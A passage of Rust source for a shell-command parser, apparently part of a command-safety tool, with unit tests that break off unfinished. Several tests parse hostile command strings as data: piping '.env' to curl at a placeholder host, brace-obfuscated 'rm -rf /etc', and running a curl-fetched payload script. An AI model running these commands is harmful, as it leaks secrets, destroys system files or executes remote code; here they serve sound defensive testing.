            return Some(span_for(node));
        }
        node = parent;
    }
}

fn conditionally_executed_in_shell(mut node: Node<'_>) -> bool {
    while let Some(parent) = node.parent() {
        if matches!(parent.kind(), "subshell" | "pipeline")
            || statement_terminator_for(node) == Some(StatementTerminator::Background)
        {
            break;
        }
        if matches!(
            parent.kind(),
            "if_statement"
                | "elif_clause"
                | "while_statement"
                | "for_statement"
                | "c_style_for_statement"
                | "case_statement"
                | "case_item"
                | "list"
        ) {
            return true;
        }
        node = parent;
    }
    false
}

fn is_guarded_command(mut node: Node<'_>) -> bool {
    while let Some(parent) = node.parent() {
        match parent.kind() {
            "if_statement"
            | "elif_clause"
            | "while_statement"
            | "for_statement"
            | "c_style_for_statement"
            | "case_statement"
            | "case_item"
            | "list"
            | "subshell" => return true,
            _ => {}
        }
        node = parent;
    }

    false
}

fn nearest_ancestor_span(mut node: Node<'_>, kinds: &[&str]) -> Option<SourceSpan> {
    while let Some(parent) = node.parent() {
        if kinds.iter().any(|kind| parent.kind() == *kind) {
            return Some(span_for(parent));
        }
        node = parent;
    }

    None
}

fn outermost_ancestor_span(mut node: Node<'_>, kinds: &[&str]) -> Option<SourceSpan> {
    let mut span = None;
    while let Some(parent) = node.parent() {
        if kinds.iter().any(|kind| parent.kind() == *kind) {
            span = Some(span_for(parent));
        }
        node = parent;
    }

    span
}

fn named_children_of_kind<'tree>(node: Node<'tree>, kind: Option<&str>) -> Vec<Node<'tree>> {
    all_children(node)
        .into_iter()
        .filter(|child| child.is_named() && kind.map(|kind| child.kind() == kind).unwrap_or(true))
        .collect()
}

fn all_children<'tree>(node: Node<'tree>) -> Vec<Node<'tree>> {
    (0..node.child_count())
        .filter_map(|index| child_at(node, index))
        .collect()
}

fn parse_variable_assignment(node: Node<'_>, source: &[u8]) -> Option<VariableAssignmentFact> {
    let mut name = None;
    let mut value = None;
    let mut saw_equals = false;
    let mut operator = AssignmentOperator::Assign;

    for i in 0..node.child_count() {
        let Some(child) = child_at(node, i) else {
            continue;
        };

        if child.kind() == "variable_name" {
            name = Some(source_text(child, source));
            continue;
        }

        if !child.is_named() {
            let text = source_text(child, source);
            if text == "=" || text == "+=" {
                saw_equals = true;
                operator = if text == "+=" {
                    AssignmentOperator::Append
                } else {
                    AssignmentOperator::Assign
                };
            }
            continue;
        }

        value = Some(assignment_value_fact_from_node(child, source));
    }

    let name = name?;
    let value = match value {
        Some(value) => value,
        None if saw_equals => AssignmentValueFact {
            text: String::new(),
            quoted: false,
            node_kind: "empty".to_string(),
            span: span_for(node),
            command_substitutions: Vec::new(),
        },
        None => return None,
    };

    Some(VariableAssignmentFact {
        name,
        operator,
        value,
        span: span_for(node),
    })
}

fn assignment_value_fact_from_node(node: Node<'_>, source: &[u8]) -> AssignmentValueFact {
    if let Some((text, quoted)) = extract_token_text(node, source) {
        return AssignmentValueFact {
            text,
            quoted,
            node_kind: node.kind().to_string(),
            span: span_for(node),
            command_substitutions: command_substitutions_for_expansion_node(node, source),
        };
    }

    AssignmentValueFact {
        text: source_text(node, source),
        quoted: false,
        node_kind: node.kind().to_string(),
        span: span_for(node),
        command_substitutions: command_substitutions_for_expansion_node(node, source),
    }
}

fn extract_redirections(root: Node<'_>, source: &[u8]) -> Vec<RedirectionFact> {
    let mut redirections = Vec::new();

    walk(root, &mut |node| match node.kind() {
        "file_redirect" => {
            if !is_nested_shell_substructure(node) {
                redirections.push(parse_file_redirect(node, source));
            }
        }
        "herestring_redirect" => {
            if !is_nested_shell_substructure(node) {
                redirections.push(parse_herestring(node, source));
            }
        }
        "heredoc_redirect" => {
            if !is_nested_shell_substructure(node) {
                redirections.push(parse_heredoc(node, source));
            }
        }
        _ => {}
    });

    redirections
}

fn is_nested_shell_substructure(node: Node<'_>) -> bool {
    let mut current = node;

    while let Some(parent) = current.parent() {
        if matches!(
            parent.kind(),
            "command_substitution" | "process_substitution" | "function_definition"
        ) {
            return true;
        }

        current = parent;
    }

    false
}

fn parse_file_redirect(node: Node<'_>, source: &[u8]) -> RedirectionFact {
    let mut file_descriptor = None;
    let mut operator = None;
    let mut target = None;

    for i in 0..node.child_count() {
        let Some(child) = child_at(node, i) else {
            continue;
        };

        if child.kind() == "file_descriptor" {
            file_descriptor = Some(source_text(child, source));
        } else if target.is_none()
            && let Some((text, quoted)) = extract_token_text(child, source)
        {
            target = Some(RedirectionOperandFact {
                text,
                quoted,
                node_kind: child.kind().to_string(),
                span: span_for(child),
            });
        } else if !child.is_named() {
            let text = source_text(child, source);
            operator = Some(
                if text == "<" && source.get(child.end_byte()) == Some(&b'>') {
                    "<>".to_string()
                } else {
                    text
                },
            );
        }
    }

    let (parent_command_name, parent_command_span) = parent_command_info(node, source);

    if let Some(operand) = &mut target {
        let mut cursor = node.walk();
        for fragment in node
            .children_by_field_name("destination", &mut cursor)
            .skip(1)
        {
            if fragment.start_byte() != operand.span.end_byte {
                break;
            }
            operand.span.end_byte = fragment.end_byte();
            operand.span.end_row = fragment.end_position().row;
            operand.span.end_column = fragment.end_position().column;
            operand.text =
                String::from_utf8_lossy(&source[operand.span.start_byte..operand.span.end_byte])
                    .into_owned();
            operand.quoted = false;
            operand.node_kind = "concatenation".into();
        }
    }

    let repaired_close_operand = target
        .as_ref()
        .filter(|operand| {
            operand.text == "-"
                && matches!(operand.node_kind.as_str(), "word" | "number")
                && operator
                    .as_deref()
                    .is_some_and(|op| matches!(op, "<&" | ">&"))
                && all_children(node)
                    .iter()
                    .any(|child| !child.is_named() && child.end_byte() == operand.span.start_byte)
        })
        .map(|operand| operand.span.clone());
    if repaired_close_operand.is_some() {
        operator.as_mut().unwrap().push('-');
    }
    if operator
        .as_deref()
        .is_some_and(|op| matches!(op, "<&-" | ">&-"))
    {
        target = None;
    }
    // Keep the actual redirect's source extent separate from trailing argv
    // that happens to be nested under this AST node.
    let end_byte = repaired_close_operand
        .as_ref()
        .map(|span| span.end_byte)
        .or_else(|| target.as_ref().map(|operand| operand.span.end_byte))
        .or_else(|| {
            all_children(node)
                .into_iter()
                .find(|child| !child.is_named())
                .map(|child| child.end_byte())
        })
        .unwrap_or(node.end_byte());
    let end_point = repaired_close_operand
        .as_ref()
        .map(|span| (span.end_row, span.end_column))
        .or_else(|| {
            target
                .as_ref()
                .map(|operand| (operand.span.end_row, operand.span.end_column))
        })
        .or_else(|| {
            all_children(node)
                .into_iter()
                .find(|child| !child.is_named())
                .map(|child| (child.end_position().row, child.end_position().column))
        })
        .unwrap_or((node.end_position().row, node.end_position().column));
    let mut span = span_for(node);
    span.end_byte = end_byte;
    span.end_row = end_point.0;
    span.end_column = end_point.1;

    RedirectionFact {
        kind: RedirectionKind::File,
        text: String::from_utf8_lossy(&source[node.start_byte()..end_byte]).into_owned(),
        file_descriptor,
        operator,
        heredoc_start: None,
        target,
        content: None,
        parent_command_name,
        parent_command_span,
        opening_statement: redirection_opening_statement(node, source),
        top_level_span: top_level_command_span(node),
        span,
    }
}

fn parse_herestring(node: Node<'_>, source: &[u8]) -> RedirectionFact {
    let mut file_descriptor = None;
    let mut operator = None;
    let mut content = None;

    for i in 0..node.child_count() {
        let Some(child) = child_at(node, i) else {
            continue;
        };

        if child.kind() == "file_descriptor" {
            file_descriptor = Some(source_text(child, source));
        } else if let Some((text, quoted)) = extract_token_text(child, source) {
            content = Some(RedirectionOperandFact {
                text,
                quoted,
                node_kind: child.kind().to_string(),
                span: span_for(child),
            });
            break;
        } else if !child.is_named() {
            operator = Some(source_text(child, source));
        }
    }

    let (parent_command_name, parent_command_span) = parent_command_info(node, source);

    RedirectionFact {
        kind: RedirectionKind::HereString,
        text: source_text(node, source),
        file_descriptor,
        operator,
        heredoc_start: None,
        target: None,
        content,
        parent_command_name,
        parent_command_span,
        opening_statement: redirection_opening_statement(node, source),
        top_level_span: top_level_command_span(node),
        span: span_for(node),
    }
}

fn parse_heredoc(node: Node<'_>, source: &[u8]) -> RedirectionFact {
    let mut file_descriptor = None;
    let mut operator = None;
    let mut heredoc_start = None;
    let mut content = None;

    for i in 0..node.child_count() {
        let Some(child) = child_at(node, i) else {
            continue;
        };

        if child.kind() == "file_descriptor" {
            file_descriptor = Some(source_text(child, source));
        } else if child.kind() == "heredoc_start" {
            heredoc_start = Some(RedirectionOperandFact {
                text: source_text(child, source),
                quoted: heredoc_start_is_quoted(child, source),
                node_kind: child.kind().to_string(),
                span: span_for(child),
            });
        } else if child.kind() == "heredoc_body" {
            content = Some(RedirectionOperandFact {
                text: source_text(child, source),
                quoted: false,
                node_kind: child.kind().to_string(),
                span: span_for(child),
            });
        } else if !child.is_named() {
            operator = Some(source_text(child, source));
        }
    }

    let (parent_command_name, parent_command_span) = parent_command_info(node, source);

    RedirectionFact {
        kind: RedirectionKind::HereDoc,
        text: source_text(node, source),
        file_descriptor,
        operator,
        heredoc_start,
        target: None,
        content,
        parent_command_name,
        parent_command_span,
        opening_statement: redirection_opening_statement(node, source),
        top_level_span: top_level_command_span(node),
        span: span_for(node),
    }
}

fn heredoc_start_is_quoted(node: Node<'_>, source: &[u8]) -> bool {
    let text = source_text(node, source);
    let delimiter = text
        .strip_prefix("<<-")
        .or_else(|| text.strip_prefix("<<"))
        .unwrap_or(text.as_str())
        .trim();
    delimiter.starts_with('\'')
        || delimiter.ends_with('\'')
        || delimiter.starts_with('"')
        || delimiter.ends_with('"')
}

fn parent_command_info(node: Node<'_>, source: &[u8]) -> (Option<String>, Option<SourceSpan>) {
    let command = if node
        .parent()
        .is_some_and(|parent| parent.kind() == "redirected_statement")
    {
        node.parent().and_then(|parent| {
            for i in 0..parent.child_count() {
                let child = child_at(parent, i)?;
                if child.kind() == "command" {
                    return Some(child);
                }
            }
            None
        })
    } else {
        find_ancestor_kind(node, "command")
    };

    (
        command.and_then(|command| extract_command_name(command, source)),
        command.map(|command| span_for(simple_command_scope(command))),
    )
}

fn redirection_opening_statement(node: Node<'_>, source: &[u8]) -> Option<CommandFact> {
    if parent_command_info(node, source).1.is_some() {
        return None;
    }
    let owner = node
        .parent()
        .filter(|p| p.kind() == "redirected_statement")
        .unwrap_or(node);
    let pipeline = find_ancestor_kind(owner, "pipeline");
    Some(CommandFact {
        command_name: None,
        command_name_runtime_data: false,
        text: source_text(owner, source),
        prefix_assignments: Vec::new(),
        tokens: Vec::new(),
        in_pipeline: pipeline.is_some(),
        pipeline_position: pipeline.and_then(|p| pipeline_position_for_command(owner, p)),
        pipeline_span: pipeline.map(span_for),
        terminator: statement_terminator_for(owner),
        guarded: is_guarded_command(owner),
        conditional_execution: conditionally_executed_in_shell(owner),
        shell_scope_span: enclosing_shell_scope(owner),
        subshell_span: nearest_ancestor_span(owner, &["subshell"]),
        control_flow_span: outermost_ancestor_span(
            owner,
            &[
                "if_statement",
                "while_statement",
                "for_statement",
                "c_style_for_statement",
                "case_statement",
            ],
        ),
        top_level_span: top_level_command_span(owner),
        span: span_for(owner),
    })
}

fn extract_command_name(node: Node<'_>, source: &[u8]) -> Option<String> {
    let mut name_span: Option<SourceSpan> = None;
    for child in simple_command_words(node) {
        if child.kind() == "command_name" {
            name_span = Some(span_for(child));
        } else if let Some(span) = &mut name_span {
            if extract_token_text(child, source).is_some()
                && continuation_gap(source, span.end_byte, child.start_byte())
            {
                span.end_byte = child.end_byte();
            } else {
                break;
            }
        }
    }
    name_span
        .map(|span| String::from_utf8_lossy(&source[span.start_byte..span.end_byte]).into_owned())
}

fn extract_token_text(node: Node<'_>, source: &[u8]) -> Option<(String, bool)> {
    match node.kind() {
        "word"
        | "number"
        | "brace_expression"
        | "concatenation"
        | "simple_expansion"
        | "expansion"
        | "command_substitution"
        | "process_substitution"
        | "arithmetic_expansion" => Some((source_text(node, source), false)),
        "string" => Some((extract_interpolated_string(node, source), true)),
        "raw_string" => Some((strip_wrapping_quotes(source_text(node, source)), true)),
        "ansi_c_string" => Some((decode_ansi_c_string(source_text(node, source)), true)),
        _ => None,
    }
}

fn extract_interpolated_string(node: Node<'_>, source: &[u8]) -> String {
    // Named AST children do not cover every source byte (notably newlines).
    // Keep the raw interior, including escapes and expansion syntax, for the
    // existing argv/materialization layers to interpret exactly once.
    let text = node.utf8_text(source).unwrap_or_default();
    if node.has_error() {
        return text.to_string();
    }
    text.strip_prefix('"')
        .and_then(|inner| inner.strip_suffix('"'))
        .unwrap_or(text)
        .to_string()
}

fn command_substitutions_for_expansion_node(
    node: Node<'_>,
    source: &[u8],
) -> Vec<CommandSubstitutionFact> {
    let mut substitutions = Vec::new();
    collect_command_substitutions_for_expansion_node(node, source, &mut substitutions);
    substitutions
}

fn collect_command_substitutions_for_expansion_node(
    node: Node<'_>,
    source: &[u8],
    substitutions: &mut Vec<CommandSubstitutionFact>,
) {
    if node.kind() == "command_substitution" {
        if let Some(fact) = command_substitution_fact_from_node(node, source) {
            substitutions.push(fact);
        }
        return;
    }

    for i in 0..node.child_count() {
        let Some(child) = child_at(node, i) else {
            continue;
        };

        collect_command_substitutions_for_expansion_node(child, source, substitutions);
    }
}

fn command_substitution_fact_from_node(
    node: Node<'_>,
    source: &[u8],
) -> Option<CommandSubstitutionFact> {
    let text = source_text(node, source);
    let body_text = command_substitution_body_text(&text)?;

    Some(CommandSubstitutionFact {
        text,
        body_text,
        span: span_for(node),
    })
}

fn command_substitution_body_text(text: &str) -> Option<String> {
    if let Some(body) = text
        .strip_prefix("$(")
        .and_then(|rest| rest.strip_suffix(')'))
    {
        return Some(body.to_string());
    }

    if let Some(body) = text
        .strip_prefix('`')
        .and_then(|rest| rest.strip_suffix('`'))
    {
        return Some(crate::backtick::decode_body(body));
    }

    None
}

fn process_substitution_parts(text: &str) -> Option<(ProcessSubstitutionOperator, String)> {
    if let Some(body) = text
        .strip_prefix("<(")
        .and_then(|rest| rest.strip_suffix(')'))
    {
        return Some((ProcessSubstitutionOperator::Input, body.to_string()));
    }

    if let Some(body) = text
        .strip_prefix(">(")
        .and_then(|rest| rest.strip_suffix(')'))
    {
        return Some((ProcessSubstitutionOperator::Output, body.to_string()));
    }

    None
}

fn strip_wrapping_quotes(text: String) -> String {
    if text.len() >= 2 {
        let starts_with_quote = text.starts_with('"') || text.starts_with('\'');
        let ends_with_quote = text.ends_with('"') || text.ends_with('\'');
        if starts_with_quote && ends_with_quote {
            return text[1..text.len() - 1].to_string();
        }
    }

    text
}

fn decode_ansi_c_string(text: String) -> String {
    let inner = text
        .strip_prefix("$'")
        .and_then(|rest| rest.strip_suffix('\''))
        .unwrap_or(text.as_str());

    let mut decoded = String::with_capacity(inner.len());
    let mut chars = inner.chars().peekable();

    while let Some(ch) = chars.next() {
        if ch != '\\' {
            decoded.push(ch);
            continue;
        }

        let Some(escape) = chars.next() else {
            decoded.push('\\');
            break;
        };

        match escape {
            'a' => decoded.push('\u{0007}'),
            'b' => decoded.push('\u{0008}'),
            'e' | 'E' => decoded.push('\u{001b}'),
            'f' => decoded.push('\u{000c}'),
            'n' => decoded.push('\n'),
            'r' => decoded.push('\r'),
            't' => decoded.push('\t'),
            'v' => decoded.push('\u{000b}'),
            '\\' => decoded.push('\\'),
            '\'' => decoded.push('\''),
            '"' => decoded.push('"'),
            '?' => decoded.push('?'),
            'x' => {
                if let Some(value) = consume_hex_escape(&mut chars, 2) {
                    push_u8_char(&mut decoded, value);
                } else {
                    decoded.push('x');
                }
            }
            'u' => {
                if let Some(value) = consume_unicode_escape(&mut chars, 4) {
                    push_u32_char(&mut decoded, value);
                } else {
                    decoded.push('u');
                }
            }
            'U' => {
                if let Some(value) = consume_unicode_escape(&mut chars, 8) {
                    push_u32_char(&mut decoded, value);
                } else {
                    decoded.push('U');
                }
            }
            '0'..='7' => {
                let value = consume_octal_escape(escape, &mut chars);
                push_u8_char(&mut decoded, value);
            }
            other => decoded.push(other),
        }
    }

    decoded
}

fn consume_hex_escape<I>(chars: &mut std::iter::Peekable<I>, max_digits: usize) -> Option<u8>
where
    I: Iterator<Item = char>,
{
    let mut value = 0u8;
    let mut digits = 0usize;

    while digits < max_digits {
        let Some(next) = chars.peek().copied() else {
            break;
        };
        let Some(digit) = next.to_digit(16) else {
            break;
        };

        chars.next();
        value = value.saturating_mul(16).saturating_add(digit as u8);
        digits += 1;
    }

    (digits > 0).then_some(value)
}

fn consume_unicode_escape<I>(
    chars: &mut std::iter::Peekable<I>,
    digits_required: usize,
) -> Option<u32>
where
    I: Iterator<Item = char>,
{
    let mut value = 0u32;

    for _ in 0..digits_required {
        let next = chars.next()?;
        let digit = next.to_digit(16)?;
        value = value.saturating_mul(16).saturating_add(digit);
    }

    Some(value)
}

fn consume_octal_escape<I>(first: char, chars: &mut std::iter::Peekable<I>) -> u8
where
    I: Iterator<Item = char>,
{
    let mut value = first.to_digit(8).unwrap_or(0) as u8;
    let mut digits = 1usize;

    while digits < 3 {
        let Some(next) = chars.peek().copied() else {
            break;
        };
        let Some(digit) = next.to_digit(8) else {
            break;
        };

        chars.next();
        value = value.saturating_mul(8).saturating_add(digit as u8);
        digits += 1;
    }

    value
}

fn push_u8_char(output: &mut String, value: u8) {
    output.push(char::from(value));
}

fn push_u32_char(output: &mut String, value: u32) {
    if let Some(ch) = char::from_u32(value) {
        output.push(ch);
    }
}

fn source_text(node: Node<'_>, source: &[u8]) -> String {
    node.utf8_text(source).unwrap_or_default().to_string()
}

fn find_ancestor_kind<'tree>(mut node: Node<'tree>, target_kind: &str) -> Option<Node<'tree>> {
    while let Some(parent) = node.parent() {
        if parent.kind() == target_kind {
            return Some(parent);
        }
        node = parent;
    }

    None
}

fn span_for(node: Node<'_>) -> SourceSpan {
    SourceSpan {
        start_byte: node.start_byte(),
        end_byte: node.end_byte(),
        start_row: node.start_position().row,
        start_column: node.start_position().column,
        end_row: node.end_position().row,
        end_column: node.end_position().column,
    }
}

fn walk<'tree, F>(node: Node<'tree>, visitor: &mut F)
where
    F: FnMut(Node<'tree>),
{
    visitor(node);

    for i in 0..node.child_count() {
        let Some(child) = child_at(node, i) else {
            continue;
        };
        walk(child, visitor);
    }
}

fn child_at(node: Node<'_>, index: usize) -> Option<Node<'_>> {
    node.child(index as u32)
}

#[cfg(test)]
mod tests {
    use super::{
        decode_static_shell_argument, parse_command, parse_command_substitutions,
        parse_process_substitutions,
    };
    use crate::{
        AssignmentOperator, CommandTokenKind, DeclarationCommandKind, ParseError, ParseStatus,
        PipelinePosition, ProcessSubstitutionOperator, RedirectionKind, StatementTerminator,
    };
    use caushell_types::ShellKind;

    #[test]
    fn quoted_scalar_query_does_not_hide_nested_vector_words() {
        for word in [r#""${prompt:-$@}""#, r#""${prompt:-${items[@]}}""#] {
            let tree = super::with_single_argument(word, |node, _| Some(node.to_sexp())).unwrap();
            assert!(
                !super::concatenated_argument_is_scalar(word),
                "{word}: {tree}"
            );
        }
    }

    #[test]
    fn decode_static_double_quoted_argument_applies_shell_lexical_escapes_only() {
        assert_eq!(
            decode_static_shell_argument(
                r#"script \$1 \`echo hi\` \"quoted\" \\ tail \q"#,
                true,
                "string",
            ),
            Some(r#"script $1 `echo hi` "quoted" \ tail \q"#.to_string())
        );
        assert_eq!(
            decode_static_shell_argument("before\\\nafter", true, "string"),
            Some("beforeafter".to_string())
        );
        assert_eq!(
            decode_static_shell_argument("expand $VALUE", true, "string"),
            None
        );
        assert_eq!(
            decode_static_shell_argument("run `command`", true, "string"),
            None
        );
        // Single-quoted and ANSI-C strings already carry their decoded argv
        // value; their dollars and backticks are data, not expansions.
        assert_eq!(
            decode_static_shell_argument("$1 `data`", true, "raw_string"),
            Some("$1 `data`".to_string())
        );
        assert_eq!(
            decode_static_shell_argument("$1 `data`", true, "ansi_c_string"),
            Some("$1 `data`".to_string())
        );
    }

    #[test]
    fn find_exec_double_quoted_script_decodes_outer_escapes_before_nested_parse() {
        let artifact = parse_command(
            r#"find /var/tmp -exec sh -c "sh -c 'rm \"\$1\"' _ \"\$1\"" _ {} \;"#,
            ShellKind::Bash,
        )
        .expect("expected find command to parse");
        let command = artifact.commands.first().expect("expected find command");
        let script_index = command
            .tokens
            .iter()
            .position(|token| token.text == "-c")
            .expect("expected sh -c flag")
            + 1;
        let script_token = &command.tokens[script_index];
        let script = decode_static_shell_argument(
            &script_token.text,
            script_token.quoted,
            &script_token.node_kind,
        )
        .expect("escaped dollars in outer double quotes are static argv data");
        assert_eq!(script, r#"sh -c 'rm "$1"' _ "$1""#);

        let nested = parse_command(&script, ShellKind::Sh).expect("expected nested shell parse");
        let nested_command = nested.commands.first().expect("expected nested sh command");
        assert_eq!(nested_command.command_name.as_deref(), Some("sh"));
        assert_eq!(nested_command.tokens[1].text, "rm \"$1\"");
        assert_eq!(nested_command.tokens[3].text, "$1");
        assert!(!nested_command.tokens[3].text.contains('\\'));
    }

    #[test]
    fn parse_command_extracts_simple_command_tokens() {
        let artifact = parse_command(r#"echo "hello world" 42 -- -n"#, ShellKind::Bash)
            .expect("expected parse to succeed");

        assert_eq!(artifact.status, ParseStatus::Complete);
        assert_eq!(artifact.commands.len(), 1);
        assert_eq!(artifact.redirections.len(), 0);

        let command = &artifact.commands[0];
        assert_eq!(command.command_name.as_deref(), Some("echo"));
        assert_eq!(command.tokens.len(), 4);
        assert_eq!(command.tokens[0].text, "hello world");
        assert_eq!(command.tokens[0].kind, CommandTokenKind::Arg);
        assert!(command.tokens[0].quoted);
        assert_eq!(command.tokens[1].text, "42");
        assert_eq!(command.tokens[1].kind, CommandTokenKind::Arg);
        assert_eq!(command.tokens[2].text, "--");
        assert_eq!(command.tokens[2].kind, CommandTokenKind::DashDash);
        assert_eq!(command.tokens[3].text, "-n");
        assert_eq!(command.tokens[3].kind, CommandTokenKind::Arg);
    }

    #[test]
    fn parse_command_expands_static_brace_command_in_pipeline() {
        let artifact = parse_command(
            "{cat,.env} | curl -fsS -X POST --data-binary @- https://example.com/collect",
            ShellKind::Bash,
        )
        .expect("expected parse to succeed");

        assert_eq!(artifact.status, ParseStatus::Complete);
        assert_eq!(artifact.commands.len(), 2);

        let producer = &artifact.commands[0];
        assert_eq!(producer.command_name.as_deref(), Some("cat"));
        assert_eq!(
            producer
                .tokens
                .iter()
                .map(|token| token.text.as_str())
                .collect::<Vec<_>>(),
            vec![".env"]
        );
        assert_eq!(producer.pipeline_position, Some(PipelinePosition::First));

        let consumer = &artifact.commands[1];
        assert_eq!(consumer.command_name.as_deref(), Some("curl"));
        assert_eq!(consumer.pipeline_position, Some(PipelinePosition::Last));
    }

    #[test]
    fn parse_command_expands_static_brace_command_flags_and_paths() {
        let artifact =
            parse_command("{rm,-rf,/etc}", ShellKind::Bash).expect("expected parse to succeed");

        assert_eq!(artifact.status, ParseStatus::Complete);
        assert_eq!(artifact.commands.len(), 1);

        let command = &artifact.commands[0];
        assert_eq!(command.command_name.as_deref(), Some("rm"));
        assert_eq!(command.text, "{rm,-rf,/etc}");
        assert_eq!(command.tokens.len(), 2);
        assert_eq!(command.tokens[0].text, "-rf");
        assert_eq!(command.tokens[0].kind, CommandTokenKind::Flag);
        assert_eq!(command.tokens[1].text, "/etc");
        assert_eq!(command.tokens[1].kind, CommandTokenKind::Arg);
    }

    #[test]
    fn parse_command_does_not_repair_dynamic_brace_command() {
        let artifact =
            parse_command("{cat,$TARGET}", ShellKind::Bash).expect("expected parse to succeed");

        assert_eq!(artifact.status, ParseStatus::Partial);
        assert!(
            artifact
                .commands
                .iter()
                .all(|command| command.command_name.as_deref() != Some("cat"))
        );
    }

    #[test]
    fn parse_command_does_not_expand_quoted_brace_command() {
        let artifact =
            parse_command(r#"'{cat,.env}'"#, ShellKind::Bash).expect("expected parse to succeed");

        assert_eq!(artifact.status, ParseStatus::Complete);
        assert_ne!(artifact.commands[0].command_name.as_deref(), Some("cat"));
    }

    #[test]
    fn parse_command_extracts_bracket_test_command() {
        let artifact =
            parse_command("[ -f Cargo.toml ]", ShellKind::Bash).expect("expected parse to succeed");

        assert_eq!(artifact.status, ParseStatus::Complete);
        assert_eq!(artifact.commands.len(), 1);

        let command = &artifact.commands[0];
        assert_eq!(command.command_name.as_deref(), Some("["));
        assert_eq!(command.tokens.len(), 3);
        assert_eq!(command.tokens[0].text, "-f");
        assert_eq!(command.tokens[0].kind, CommandTokenKind::Arg);
        assert_eq!(command.tokens[1].text, "Cargo.toml");
        assert_eq!(command.tokens[1].kind, CommandTokenKind::Arg);
        assert_eq!(command.tokens[2].text, "]");
        assert_eq!(command.tokens[2].kind, CommandTokenKind::Arg);
    }

    #[test]
    fn parse_command_extracts_unquoted_dynamic_tokens() {
        let artifact = parse_command(r#"bash $script $(pwd) <(echo ok)"#, ShellKind::Bash)
            .expect("expected parse to succeed");

        assert_eq!(artifact.commands.len(), 1);
        let command = &artifact.commands[0];
        assert_eq!(command.command_name.as_deref(), Some("bash"));
        assert_eq!(command.tokens.len(), 3);
        assert_eq!(command.tokens[0].text, "$script");
        assert_eq!(command.tokens[0].node_kind, "simple_expansion");
        assert!(!command.tokens[0].quoted);
        assert_eq!(command.tokens[1].text, "$(pwd)");
        assert_eq!(command.tokens[1].node_kind, "command_substitution");
        assert_eq!(command.tokens[1].command_substitutions.len(), 1);
        assert_eq!(command.tokens[1].command_substitutions[0].body_text, "pwd");
        assert_eq!(command.tokens[2].text, "<(echo ok)");
        assert_eq!(command.tokens[2].node_kind, "process_substitution");
    }

    #[test]
    fn parse_command_substitution_facts_respect_single_vs_double_quotes() {
        let artifact = parse_command(r#"echo '$(id)' "$(whoami)""#, ShellKind::Bash)
            .expect("expected parse to succeed");

        let command = &artifact.commands[0];
        assert_eq!(command.tokens.len(), 2);
        assert_eq!(command.tokens[0].text, "$(id)");
        assert!(command.tokens[0].quoted);
        assert!(command.tokens[0].command_substitutions.is_empty());
        assert_eq!(command.tokens[1].text, "$(whoami)");
        assert!(command.tokens[1].quoted);
        assert_eq!(command.tokens[1].command_substitutions.len(), 1);
        assert_eq!(command.tokens[1].command_substitutions[0].text, "$(whoami)");
        assert_eq!(
            command.tokens[1].command_substitutions[0].body_text,
            "whoami"
        );
    }

    #[test]
    fn parse_assignment_command_substitution_facts_respect_single_vs_double_quotes() {
        let literal = parse_command(r#"PAYLOAD='$(id)'"#, ShellKind::Bash)
            .expect("expected parse to succeed");
        let literal_assignment = &literal.assignment_commands[0].assignments[0];
        assert_eq!(literal_assignment.value.text, "$(id)");
        assert!(literal_assignment.value.quoted);
        assert!(literal_assignment.value.command_substitutions.is_empty());

        let expanded = parse_command(r#"PAYLOAD="$(whoami)""#, ShellKind::Bash)
            .expect("expected parse to succeed");
        let expanded_assignment = &expanded.assignment_commands[0].assignments[0];
        assert_eq!(expanded_assignment.value.text, "$(whoami)");
        assert!(expanded_assignment.value.quoted);
        assert_eq!(expanded_assignment.value.command_substitutions.len(), 1);
        assert_eq!(
            expanded_assignment.value.command_substitutions[0].body_text,
            "whoami"
        );
    }

    #[test]
    fn parse_command_substitution_facts_do_not_flatten_nested_bodies() {
        let artifact = parse_command(r#"echo "$(printf "$(id)")""#, ShellKind::Bash)
            .expect("expected parse to succeed");

        let token = &artifact.commands[0].tokens[0];
        assert_eq!(token.command_substitutions.len(), 1);
        assert_eq!(token.command_substitutions[0].text, r#"$(printf "$(id)")"#);
        assert_eq!(
            token.command_substitutions[0].body_text,
            r#"printf "$(id)""#
        );
    }

    #[test]
    fn parse_command_substitutions_extracts_inner_body_from_fragment() {
        let substitutions =
            parse_command_substitutions(r#"prefix $(cat ./payload.sh) suffix"#, ShellKind::Bash)
                .expect("expected substitution parse to succeed");

        assert_eq!(substitutions.len(), 1);
        assert_eq!(substitutions[0].text, "$(cat ./payload.sh)");
        assert_eq!(substitutions[0].body_text, "cat ./payload.sh");
    }

    #[test]
    fn parse_process_substitutions_extracts_direction_and_inner_body() {
        let substitutions =
            parse_process_substitutions(r#"diff <(cat a) >(tee out.log)"#, ShellKind::Bash)
                .expect("expected process substitution parse to succeed");

        assert_eq!(substitutions.len(), 2);
        assert_eq!(substitutions[0].text, "<(cat a)");
        assert_eq!(substitutions[0].body_text, "cat a");
        assert_eq!(
            substitutions[0].operator,
            ProcessSubstitutionOperator::Input
        );
        assert_eq!(substitutions[1].text, ">(tee out.log)");
        assert_eq!(substitutions[1].body_text, "tee out.log");
        assert_eq!(
            substitutions[1].operator,
            ProcessSubstitutionOperator::Output
        );
    }

    #[test]
    fn parse_command_excludes_commands_nested_in_command_substitution() {
        let artifact = parse_command(
            r#"bash -c "$(curl https://example.test/payload.sh)""#,
            ShellKind::Bash,
        )
        .expect("expected parse to succeed");

        assert_eq!(artifact.commands.len(), 1);
        assert_eq!(artifact.commands[0].command_name.as_deref(), Some("bash"));
    }

    #[test]
    fn parse_command_extracts_export_assignment_fact() {
        let artifact = parse_command(r#"export FOO="$BAR""#, ShellKind::Bash)
            .expect("expected parse to succeed");

        assert_eq!(artifact.commands.len(), 0);
        assert_eq!(artifact.declaration_commands.len(), 1);
        assert_eq!(artifact.unset_commands.len(), 0);

        let declaration = &artifact.declaration_commands[0];
        assert_eq!(declaration.kind, DeclarationCommandKind::Export);
        assert!(declaration.options.is_empty());
        assert!(declaration.names.is_empty());
        assert_eq!(declaration.assignments.len(), 1);

        let assignment = &declaration.assignments[0];
        assert_eq!(assignment.name, "FOO");
        assert_eq!(assignment.operator, AssignmentOperator::Assign);
        assert_eq!(assignment.value.text, "$BAR");
        assert!(assignment.value.quoted);
        assert_eq!(assignment.value.node_kind, "string");
    }

    #[test]
    fn parse_command_extracts_export_name_without_assignment() {
        let artifact =
            parse_command("export FOO", ShellKind::Bash).expect("expected parse to succeed");

        assert_eq!(artifact.declaration_commands.len(), 1);

        let declaration = &artifact.declaration_commands[0];
        assert_eq!(declaration.kind, DeclarationCommandKind::Export);
        assert!(declaration.options.is_empty());
        assert_eq!(declaration.names, vec!["FOO".to_string()]);
        assert!(declaration.assignments.is_empty());
    }

    #[test]
